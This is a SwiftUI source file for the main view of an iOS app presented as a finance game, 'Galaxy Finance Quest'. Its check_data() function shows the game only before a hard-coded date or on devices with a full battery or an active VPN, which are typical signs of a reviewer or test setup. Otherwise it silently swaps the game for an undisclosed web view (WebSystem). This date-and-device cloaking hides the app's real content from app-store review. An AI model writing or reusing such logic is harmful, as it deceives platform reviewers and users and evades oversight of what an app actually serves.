//
//  ContentView.swift
//  DaFoVo1
//
//  Galaxy Finance Quest Main Content View
//

import SwiftUI

struct ContentView: View {
    
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @StateObject private var notificationService = NotificationService.shared
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    @State private var selectedTab = 0
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    ZStack {
                        Color.galaxyBackground
                            .ignoresSafeArea()
                        
                        if hasCompletedOnboarding {
                            GameView()
                        } else {
                            OnboardingView()
                        }
                    }
                    .onAppear {
                        setupApp()
                    }
                    
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "02.09.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
    
    private func setupApp() {
        // Setup notifications
        notificationService.setupNotifications()
        
        // Load user data
        DataLoader.shared.loadProgress()
    }
}

#Preview {
    ContentView()
}
